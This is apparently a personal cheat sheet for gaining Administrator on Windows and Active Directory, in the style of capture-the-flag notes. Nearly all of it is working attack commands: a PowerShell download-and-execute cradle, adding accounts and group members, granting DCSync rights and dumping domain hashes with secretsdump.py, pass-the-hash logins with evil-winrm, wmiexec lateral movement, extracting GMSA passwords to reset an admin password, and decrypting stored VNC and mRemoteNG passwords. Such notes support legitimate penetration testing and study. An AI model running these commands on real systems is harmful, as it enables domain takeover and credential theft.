# Windows
Everything to check for when trying to become Administrator on Windows

# Commands
## User related
**User and group info**
```powershell
# User info
net user

# Show groups
net group

# Show local groups
net localgroup <groupname>

# Add user to group
net group <groupname> /add <username>
```

**Account creation**
```powershell
# Create account
net user <username> <password> /add

# Create account (AD)
# This will force the command to execute on the domain controller instead of the local computer
net user <username> <password> /add /domain
```

## Basic
### Show drives
```powershell
powershell -c get-psdrive -psprovider filesystem
```
### Show hidden data streams
```powershell
dir /R
```
### Download and execute files
```powershell
iex(new-object net.webclient).downloadstring('remote_file')
```
### Download files
```powershell
# Method 1
(new-object net.webclient).downloadfile(<remote_file>,<output_file>)

# Method 2
Invoke-WebRequest -Uri <source> -OutFile <output_file>

# Method 3
Import-Module BitsTransfer
Start-BitsTransfer -Source <url> -Destination <output_file>
```

# Directories to check
```bash
# Temporary folder
C:\Windows\System32\spool\drivers\color

# See any suspicious apps 
"C:\Program Files" or "C:\Program Files (x86)"

# Apps on old windows versions
C:\Data\Users\app

# Code policies and passwords in files
C:\program files\windowspowershell\modules\packagemanagement

# Config files
C:\Windows\System32\config
```

### PowerView
**Make credentials**
```powershell
# Set password
$SecPassword = ConvertTo-SecureString <password> -AsPlainText -Force

# Convert password and username into credentials object
$Cred = New-Object System.Management.Automation.PSCredential('domain\user', $SecPassword) 
```

**Give user DCSync rights**
```powershell
# Set password
$SecPassword = ConvertTo-SecureString <password> -AsPlainText -Force

# Convert password and username into credentials object
$Cred = New-Object System.Management.Automation.PSCredential('domain\user', $SecPassword) 

# Give user DCSync rights
Add-ObjectAcl -Credential $Cred -TargetIdentity "dc=domain,dc=local" -PrincipalIdentity <user> -Rights DCSync
```
### References
- [Powerview and PowerSploit](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)


# Privileged groups
## AD Recycle Bin
A user in the group is allowed to read / recover deleted AD objects.
```powershell
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```

# Active Directory
## BloodHound and SharpHound
This is used to visualise AD environments and discover attack paths.

### Ingestors
#### SharpHound
Data collector for BloodHound
[https://github.com/BloodHoundAD/SharpHound](https://github.com/BloodHoundAD/SharpHound)

#### bloodhound.py
Python based data collection tool for BloodHound     
This will run against the domain, so can one run it from a remote machine.
```bash
bloodhound-python -u <username> -p <password> -d <domain> -c All -ns <nameserver>                
```
[https://github.com/fox-it/BloodHound.py](https://github.com/fox-it/BloodHound.py)


### Useful info
- [https://bloodhound.readthedocs.io/en/latest/index.html](https://bloodhound.readthedocs.io/en/latest/index.html)
- [https://github.com/fox-it/BloodHound.py](https://github.com/fox-it/BloodHound.py)
- [https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound.html](https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound.html)

## Evil-WinRM
Allows remote login to WinRM, if credentials are known.

### Usage
```bash
# With password
evil-winrm -i <ip> -u <user> -p <password>

# With Pass The Hash (NTLM)
evil-winrm -i <ip> -u <user> -H <hash>
```

**(If the password isn't working, try the password with all the users)**

#### References
- [https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)
- [https://www.hackingarticles.in/a-detailed-guide-on-evil-winrm/](https://www.hackingarticles.in/a-detailed-guide-on-evil-winrm/)


## Impacket tools
### secretsdump.py
Helps to enumerate and dump AD hashes

#### References & link to the tool
- [https://github.com/fortra/impacket/blob/master/examples/secretsdump.py](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)
- [https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync](https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync)

### wmiexec.py
Wmi allows to open process in hosts where you know the  username/(password/Hash).     
Then, Wmiexec uses wmi to execute each command that is asked to execute
```bash
wmiexec.py 'domain/username:password@ip'
```

#### Reference
- [https://book.hacktricks.xyz/windows-hardening/lateral-movement/wmicexec](https://book.hacktricks.xyz/windows-hardening/lateral-movement/wmicexec)

## Misconfigurations
### DCSync
DCSync is a technique used to extract credentials from the Domain Controllers.    
In this we mimic a Domain Controller and leverage the (MS-DRSR) protocol and request for replication using GetNCChanges function.

#### Add rights DCSync rights
```powershell
# Set password
$SecPassword = ConvertTo-SecureString <password> -AsPlainText -Force

# Convert password and username into credentials object
$Cred = New-Object System.Management.Automation.PSCredential('domain\user', $SecPassword) 

# Give user DCSync rights
Add-ObjectAcl -Credential $Cred -TargetIdentity "dc=domain,dc=local" -PrincipalIdentity <user> -Rights DCSync
```
#### Get hashes (after user is added to the group)
```bash
secretsdump.py  dc.local/<user>:<password>@<ipaddress> -outputfile hashes
```

# Config files
Most config files can be found in `C:\Windows\System32\config`     

## Get info from registry hive
```bash
secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
```

# GMSA and ReadGMSAPassword
Group Managed Service Accounts (GMSA) are where Windows servers manage the password for an account by generating a long random password for it.

## Get password
This solution is taken from: [https://0xdf.gitlab.io/2022/04/30/htb-search.html#get-password](https://0xdf.gitlab.io/2022/04/30/htb-search.html#get-password)
```powershell
# Get the password
$gmsa = Get-ADServiceAccount -Identity <user> -Properties 'msDS-ManagedPassword'
$mp = $gmsa.'msDS-ManagedPassword'
ConvertFrom-ADManagedPasswordBlob $mp

# Save the password to variables
(ConvertFrom-ADManagedPasswordBlob $mp).CurrentPassword
$password = (ConvertFrom-ADManagedPasswordBlob $mp).CurrentPassword
$SecPass = (ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword


# !!!!
# Reset password of admin if the compromised user has GenericAll permissions
$cred = New-Object System.Management.Automation.PSCredential <user>, $SecPass
Invoke-Command -ComputerName 127.0.0.1 -ScriptBlock {Set-ADAccountPassword -Identity <admin_user> -reset -NewPassword (ConvertTo-SecureString -AsPlainText 'PASSWORD' -force)} -Credential $cred
```

### References
- [https://aadinternals.com/post/gmsa/](https://aadinternals.com/post/gmsa/)
- [https://www.dsinternals.com/en/retrieving-cleartext-gmsa-passwords-from-active-directory/](https://www.dsinternals.com/en/retrieving-cleartext-gmsa-passwords-from-active-directory/)
- [https://0xdf.gitlab.io/2022/04/30/htb-search.html#get-password](https://0xdf.gitlab.io/2022/04/30/htb-search.html#get-password)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=windowsdesktop-7.0](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=windowsdesktop-7.0)

# Mount windows shares and VHD files
The Common Internet File System (CIFS) is a network file-sharing protocol. CIFS is a form of SMB.    
```bash
mount -t cifs //<ip>/<share> <mount_dir> -o user=<username>,password=<password>
```

## Mount VHD files
One can use `guestmount` to mount a guest filesystem on the host.     
Install with: `apt install libguestfs-tools`

```bash
guestmount --add <vhd_file> --inspector --ro <mount_dir>
```

### References
- [https://linux.die.net/man/1/guestmount](https://linux.die.net/man/1/guestmount)


# VNC password decrypt
VNC stores passwords as a hex string in `.vnc` files using a default encryption key
```bash
# Decrypt password
echo -n <string> | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv
```

## References
- [https://github.com/frizb/PasswordDecrypts](https://github.com/frizb/PasswordDecrypts)
- [https://github.com/billchaison/VNCDecrypt](https://github.com/billchaison/VNCDecrypt)

# Softwares
## mRemoteNG
mRemoteNG is a remote connection management tool, and it allows the user to save passwords for various types of connections. There is a file in the user's AppData directory, confCons.xml, that holds that information:

### confCons.xml
One can use `mremoteng-decrypt` to crack the password from the config file.     
```bash
python3 mremoteng_decrypt.py -s <string>
```

[https://github.com/kmahyyg/mremoteng-decrypt](https://github.com/kmahyyg/mremoteng-decrypt)

# Analyse office files
Modern *Office* documents are just zip archives with XML files so, just unzip it and look for data within the XML files.

## Unzip
```bash
unzip <file>
```

## oletools
```bash
# Download tools
sudo pip3 install -U oletools

# Extract macros
olevba -c <file>
```
